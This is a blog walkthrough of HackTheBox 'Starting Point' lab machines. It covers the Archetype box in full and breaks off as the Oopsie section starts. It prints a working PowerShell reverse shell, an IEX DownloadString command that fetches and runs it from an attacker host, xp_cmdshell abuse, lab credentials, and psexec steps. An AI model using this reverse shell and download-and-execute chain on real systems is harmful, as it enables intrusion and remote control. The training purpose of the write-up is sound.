<!DOCTYPE html>
<html lang="en" >
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Starting Point on HackTheBox (2020) - hackspread.com</title><meta name="Description" content="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."><meta property="og:title" content="Starting Point on HackTheBox (2020)" />
<meta property="og:description" content="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://hackspread.github.io//startingpoint2020/" /><meta property="og:image" content="https://hackspread.github.io/startingpoint2020/featured-image.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-12-14T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-06-20T00:35:13-04:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://hackspread.github.io/startingpoint2020/featured-image.jpg"/>
<meta name="twitter:title" content="Starting Point on HackTheBox (2020)"/>
<meta name="twitter:description" content="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."/>
<meta name="application-name" content="psqnix.github.io">
<meta name="apple-mobile-web-app-title" content="psqnix.github.io"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="stylesheet" href="../../../css/custom.css">
        <link rel="stylesheet" href="../../../css/style.css"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hackspread.github.io//startingpoint2020/" /><link rel="next" href="https://hackspread.github.io//practicalbinaryanalysis_intro/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Starting Point on HackTheBox (2020)",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/hackspread.github.io\/\/startingpoint2020\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/hackspread.github.io\/startingpoint2020\/featured-image.jpg",
                            "width":  768 ,
                            "height":  1621 
                        }],"genre": "posts","keywords": "Hacking, HackTheBox, Penetration Testing","wordcount":  6660 ,
        "url": "https:\/\/hackspread.github.io\/\/startingpoint2020\/","datePublished": "2020-12-14T00:00:00+00:00","dateModified": "2022-06-20T00:35:13-04:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/hackspread.github.io\/images\/avatar.png",
                    "width":  358 ,
                    "height":  358 
                }},"author": {
                "@type": "Person",
                "name": "HackTheBox"
            },"description": "This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto" ><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop" style="border-bottom:1px solid #E1E1E1;box-shadow: 0 0 1.5rem 0 #E1E1E1;"> 
    
    <div class="header-wrapper">
        <div class="header-title" >
            <a href="//" title="hackspread.com"><img src="/images/mylogo.png">

  
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="//" title="hackspread.com"><img src="/images/mylogo-mobile.png">
                    
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main" >
                <div class="container" style="max-width: 100%;margin:0;padding-left:0;padding-right: 0;" ><div>
    <img
        width="200"
        height="400"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="/startingpoint2020/featured-image.jpg"
        data-srcset="/startingpoint2020/featured-image.jpg, /startingpoint2020/featured-image.jpg 1.5x, /startingpoint2020/featured-image.jpg 2x"
        data-sizes="auto"
        alt="/startingpoint2020/featured-image.jpg"
        title="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."
        style="width: 100%;object-fit: cover;margin: 0pt;"/></div><div class="toc" id="toc-auto" style="position:relative;background-color: #E0E0E0;">
            <table >
                <tr style="position:relative;background-color: #E0E0E0;border: 2px solid white;border-left: none;border-right: none;">
                    <td style="text-align:center;vertical-align: middle;" >Table of Contents</td>
                </tr></table>
           
        

         
         <div class="toc-content" id="toc-content-auto"></div>
    
    
            
        </div><article class="page single" style="border:0px solid black;max-width:1400px;flex-wrap: wrap;padding:2%;"><h1 class="single-title animated flipInX">Starting Point on HackTheBox (2020)</h1>
<div class="post-meta">

           
            <div class="post-meta-line" style="padding-top: 25px;;">
                <table ><tr>
                <td style="border:none"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="14-12-2020">14-12-2020</time>&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;32 minutes&nbsp;
</td><td style="border:none;text-align: right;">
                <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="//">Home</a></span></td>
            </tr></table>
            </div>


          
            

        </div>
<div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">INTRODUCTION</a></li>
    <li><a href="#9656-archtype">▸ ARCHTYPE</a>
      <ul>
        <li><a href="#9702-about">◦ About</a></li>
        <li><a href="#9702--enumeration">◦  Enumeration</a></li>
        <li><a href="#9702-foothold">◦ Foothold</a></li>
        <li><a href="#9702--privilege-escalation">◦  Privilege Escalation</a></li>
      </ul>
    </li>
    <li><a href="#9656--oopsie">▸  OOPSIE</a>
      <ul>
        <li><a href="#9702--about">◦  About</a></li>
        <li><a href="#9702--enumeration-1">◦  Enumeration</a></li>
        <li><a href="#9702-foothold-1">◦ Foothold</a></li>
        <li><a href="#9702-lateral-movement">◦ Lateral Movement</a></li>
        <li><a href="#9702--privilege-escalation-1">◦  Privilege Escalation</a>
          <ul>
            <li><a href="#x25b9--setuid">▹  <em><strong>Setuid</strong></em></a></li>
          </ul>
        </li>
        <li><a href="#9702--post-exploitation">◦  Post Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#9656-vaccine">▸ VACCINE</a>
      <ul>
        <li><a href="#9702-about-1">◦ About</a></li>
        <li><a href="#9702-enumeration">◦ Enumeration</a></li>
        <li><a href="#9702-foothold-2">◦ Foothold</a></li>
        <li><a href="#9702-privilege-escalation">◦ Privilege Escalation</a></li>
      </ul>
    </li>
    <li><a href="#9656-shield">▸ SHIELD</a>
      <ul>
        <li><a href="#9702-about-2">◦ About</a></li>
        <li><a href="#9702-enumeration-1">◦ Enumeration</a></li>
        <li><a href="#9702-foothold-3">◦ Foothold</a></li>
        <li><a href="#9702-using-netcat">◦ <em><strong>Using Netcat</strong></em></a></li>
        <li><a href="#9702-privilege-escalation-1">◦ Privilege Escalation</a></li>
        <li><a href="#9702-post-exploitation">◦ Post Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#9656-pathfinder">▸ PATHFINDER</a>
      <ul>
        <li><a href="#9702-enumeration-2">◦ Enumeration</a></li>
        <li><a href="#9702-lateral-movement-1">◦ Lateral Movement</a></li>
        <li><a href="#9702-privilege-escalation-2">◦ Privilege Escalation</a></li>
      </ul>
    </li>
    <li><a href="#9656-included-linux">▸ INCLUDED (Linux)</a>
      <ul>
        <li><a href="#9702-enumeration-3">◦ Enumeration</a></li>
        <li><a href="#9702-lfilocal-file-inclusion">◦ LFI(Local File Inclusion)</a></li>
        <li><a href="#9702-foothold-4">◦ Foothold</a></li>
        <li><a href="#x25b9-lxd">▹ LXD</a></li>
        <li><a href="#9702-lxd-privilege-escalation">◦ LXD Privilege Escalation</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><style>
* {
  box-sizing: border-box;
}

.zoom:hover{
      cursor: -moz-zoom-in; 
    cursor: -webkit-zoom-in; 
    cursor: zoom-in;
}

.zoom:link {
 

  transition: transform .2s;
  
  margin: 0 auto;
}

.zoom:active {
      cursor: -moz-zoom-in; 
    cursor: -webkit-zoom-in; 
    cursor: zoom-in;
  -ms-transform: scale(2); /* IE 9 */
  -webkit-transform: scale(2); /* Safari 3-8 */
  transform: scale(2); 
   position: absolute;
    z-index: 9999;
  
}
</style>
<h2 id="introduction">INTRODUCTION</h2>
<p>(<a href="sp2020.pdf" target="_blank">pdf</a>)</p>
<p>This path is composed of 6 boxes in a way that later boxes use information (like credentials) gathered from the previous ones.
<br>
<br></p>
<h2 id="9656-archtype">▸ ARCHTYPE</h2>
<h3 id="9702-about">◦ About</h3>
<p>This is a Windows box where you can learn how enumeration can lead to RCE via SQL server queries.</p>
<ul>
<li>Machine : <b>Archetype</b> </li>
<li>Ip: <b>10.10.10.27</b></li>
</ul>
<br>
<h3 id="9702--enumeration">◦  Enumeration</h3>
<p>We use nmap (a free and open source utility for network discovery and security auditing) to:</p>
<p>·         -sV: Probe open ports to determine service/version info</p>
<p>·         -sC: equivalent to &ndash;script=default</p>
<p><em><strong>nmap -sC -sV 10.10.10.27</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sudo nmap -sC -sV 10.10.10.27
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali: 
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-04 08:58 EDT
Nmap scan report <span class="k">for</span> 10.10.10.27
Host is up <span class="o">(</span>0.046s latency<span class="o">)</span>.
Not shown: <span class="m">996</span> closed ports
PORT     STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> microsoft-ds
1433/tcp  open  ms-sql-s       Microsoft SQL Server <span class="m">2017</span> 14.00.1000.00<span class="p">;</span> RTM
<span class="p">|</span> ms-sql-ntlm-info: 
<span class="p">|</span>   Target_Name: ARCHETYPE
<span class="p">|</span>   NetBIOS_Domain_Name: ARCHETYPE
<span class="p">|</span>   NetBIOS_Computer_Name: ARCHETYPE
<span class="p">|</span>   DNS_Domain_Name: Archetype
<span class="p">|</span>   DNS_Computer_Name: Archetype
<span class="p">|</span>_  Product_Version: 10.0.17763
....
Host script results:
<span class="p">|</span>_clock-skew: mean: 1h38m45s, deviation: 3h07m52s, median: 14m44s
<span class="p">|</span> ms-sql-info: 
<span class="p">|</span>   OS: Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> <span class="o">(</span>Windows Server <span class="m">2019</span> Standard 6.3<span class="o">)</span>
<span class="p">|</span>   Computer name: Archetype
<span class="p">|</span>   NetBIOS computer name: ARCHETYPE<span class="se">\x</span><span class="m">00</span>
<span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
</code></pre></td></tr></table>
</div>
</div><p>Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.</p>
<p>It is worth checking to see if anonymous access has been permitted, as
file shares often store configuration files containing passwords or
other sensitive information. We can use smbclient to list available
shares.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">smbclient -N -L <span class="se">\\</span>10.10.10.27

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

SMB1 disabled -- no workgroup available
</code></pre></td></tr></table>
</div>
</div><p>It seems there is a share called <strong>backups</strong>. Let&rsquo;s attempt to access it
and see what&rsquo;s inside.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">smbclient -N  <span class="se">\\</span>10.10.10.27<span class="se">\b</span>ackups

Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> dir
  ..                                DR        <span class="m">0</span>  Mon Jan <span class="m">20</span> 07:20:57 <span class="m">2020</span>
  ..                                DR        <span class="m">0</span>  Mon Jan <span class="m">20</span> 07:20:57 <span class="m">2020</span>
  prod.dtsConfig                     AR      <span class="m">609</span>  Mon Jan <span class="m">20</span> 07:23:02 <span class="m">2020</span>

smb: <span class="se">\&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>There is a <b>dtsConfig</b> file, which is a config file used with SSIS. Let’s
see the code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">smb: <span class="se">\&gt;</span> get prod.dtsConfig
  
  getting file <span class="se">\p</span>rod.dtsConfig of size <span class="m">609</span> as prod.dtsConfig <span class="o">(</span>3.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.5 KiloBytes/sec<span class="o">)</span>
  
smb: <span class="se">\&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Checking the file we see:</p>
<ul>
<li>
<p>The password: <strong>M3g4c0rp123</strong></p>
</li>
<li>
<p>The user ID : <strong>ARCHETYPE\sql_svc</strong></p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">more prod.dtsConfig

&lt;DTSConfiguration&gt;

    &lt;DTSConfigurationHeading&gt;

      …..

      &lt;ConfiguredValue&gt;Data <span class="nv">Source</span><span class="o">=</span>.<span class="p">;</span><span class="nv">Password</span><span class="o">=</span>M3g4c0rp123<span class="p">;</span> User <span class="nv">ID</span><span class="o">=</span>ARCHETYPE<span class="se">\s</span>ql_svc<span class="p">;</span> &lt;- username and password

        .….

        …..

     &lt;/ConfiguredValue&gt;

    ……

&lt;/DTSConfiguration&gt;
</code></pre></td></tr></table>
</div>
</div><h3 id="9702-foothold">◦ Foothold</h3>
<p>Let&rsquo;s try connecting to the SQL Server using “mssqlclient.py” (from Impacket) using the credentials found in “<strong>prod.dtsConfig</strong>” for the local Windows user <strong>ARCHETYPE\sql_svc</strong> (pwd:<strong>M3g4c0rp123</strong> ):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">python3 /usr/share/doc/python3-impacket/examples/**mssqlclient.py** ARCHETYPE/sql<span class="se">\_</span>svc@10.10.10.27 -windows-auth

Password:
<span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
<span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
<span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> 3232<span class="o">)</span>
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands

SQL&gt;
</code></pre></td></tr></table>
</div>
</div><p>We can use the IS_SRVROLEMEMBER function to reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. Luckily we do have sysadmin privileges and we can now enable xp_cmdshell and gain RCE (remote code execution) on the host. Let&rsquo;s attempt this, by inputting the commands below:</p>
<ol>
<li>
<p>EXEC sp_configure &lsquo;Show Advanced Options&rsquo;, 1;</p>
</li>
<li>
<p>reconfigure;</p>
</li>
<li>
<p>EXEC sp_configure &lsquo;xp_cmdshell&rsquo;, 1</p>
</li>
<li>
<p>reconfigure;</p>
</li>
<li>
<p>xp_cmdshell &ldquo;whoami&rdquo;</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">SQL&gt;EXEC sp_configure &#39;Show Advanced Options&#39;, 1;
reconfigure;
....
SQL&gt; EXEC sp_configure &#39;xp_cmdshell&#39;, 1
[*] INFO(ARCHETYPE): Line 185: Configuration option &#39;xp_cmdshell&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL&gt; reconfigure;
SQL&gt; xp_cmdshell &#34;whoami&#34;
output                                                                       
-------------------------------------------------------------------------------- 
archetype\sql_svc
                                                              
NULL

</code></pre></td></tr></table>
</div>
</div><p>The whoami command output reveals that the SQL Server is also running in the context of the user <strong>ARCHETYPE\sql_svc</strong>. However, this account doesn&rsquo;t seem to have administrative privileges on the host. Let&rsquo;s attempt to get a proper shell, and proceed to further enumerate the system. We can save the PowerShell reverse shell below as <strong>shell.ps1</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">$client = New-Object System.Net.Sockets.TCPClient(&#34;10.10.14.16&#34;,443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2&gt;&amp;1 | Out-String );
$sendback2 = $sendback + &#34;# &#34;;
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()

</code></pre></td></tr></table>
</div>
</div><p>Next, let’s start up a mini webserver in python in order to host the file. We can use the following Python command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~/HTB/StartingPoint/Archtype $ sudo python3 –m http.server <span class="m">80</span>
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali:
Serving  HTTP  on  0.0.0.0  port  <span class="m">80</span>  <span class="o">(</span>http://0.0.0.0:80<span class="o">)</span>  …
</code></pre></td></tr></table>
</div>
</div><p>Here we can use:</p>
<p>·         netcat (a feature-packed networking utility) to reads and writes data across the network.
·         ufw (Uncomplicated FireWall) to allow incoming connections from a specific IP.</p>
<p>After standing up a netcat listener on port 443, we can use ufw to allow the callbacks on port 80 and 443 to our machine:</p>
<p>·         nc -lvnp 443
·         ufw allow from 10.10.10.27 proto tcp to any port 80,443</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~/HTB/StartingPoint/Archtype $ sudo  nc –lvpn <span class="m">4433</span>
listening  on  <span class="o">[</span>any<span class="o">]</span>  <span class="m">443</span>  …

sudo  ufw  allow  from  10.10.10.27 proto  tcp  to  any  port  80,443
</code></pre></td></tr></table>
</div>
</div><p>We can now issue the command to download and execute the reverse shell
through xp_cmdshell . (10.10.14.16 attacking machine)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">xp_cmdshell &#34;powershell &#34;IEX (New-Object Net.WebClient).DownloadString(\&#34;http://10.10.14.16/shell.ps1\&#34;);&#34;
</code></pre></td></tr></table>
</div>
</div><!-- 
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_3.png"></div>
-->
<p>We can see from our mini webserver that a file has been downloaded</p>
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_4.png"></div>
<p>A shell  is received as <strong>sql_svc</strong>, and we can get the user.txt on
their desktop.</p>
<div style="width:100%; background-color:#252b34"><img src="StartingPoint_5.png"></div>
<p>Using Tmux, that’s all in one window:</p>
<div style="width:100%; background-color:#252b34"><img width="80%" src="StartingPoint_6.png"></div>
<h3 id="9702--privilege-escalation">◦  Privilege Escalation</h3>
<p>As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the type(link)command to access the PowerShell history file (ConsoleHost_history.txt) to see the administrator’s credentials</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell \PSReadline\ConsoleHost_history.txt 
</code></pre></td></tr></table>
</div>
</div><p>From the ConsoleHost_history.txt we can see the administrator password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  net.exe use T: \\Archetype\backups /user:**administrator** **MEGACORP_4dm1n!!**  
  exit  
</code></pre></td></tr></table>
</div>
</div><p>Below an image of the tree commands:</p>
<div style="width:100%; background-color:#252b34;"><img width="40%" src="StartingPoint_7.png">a</div>
<p>This also reveals that the backups drive has been mapped using the local
administrator credentials. We can use Impacket&rsquo;s psexec.py to gain a
privileged shell .</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"> python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27 
</code></pre></td></tr></table>
</div>
</div><!-- <div style="width:100%; background-color:#252b34"><img src="StartingPoint_8.png"></div> -->
<br>
Below we can see that we gained Administrative privileges:
<br>
<div style="width:100%; background-color:#252b34;text-align: left;"><img src="StartingPoint_9.png" style="width:40%";></div>
 We can now search for <b>"root.txt"</b>.
<!-- <div style="width:100%; background-color:#252b34"><img src="StartingPoint_10.png" style="width:100%;height:100%"></div>-->
<br>
<br>
<h2 id="9656--oopsie">▸  OOPSIE</h2>
<br>
<h3 id="9702--about">◦  About</h3>
<p>This box features debugging session and MySQL enumeration</p>
<ul>
<li>Machine : <b>Oopsie</b> </li>
<li>Ip: <b>10.10.10.28</b></li>
</ul>
<br>
<h3 id="9702--enumeration-1">◦  Enumeration</h3>
<p><em><strong>nmap -sC -sV 10.10.10.28</strong></em></p>
<p>Running a simple Nmap scan reveals <em><strong>two</strong></em> open ports running, for SSH
and Apache respectively.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
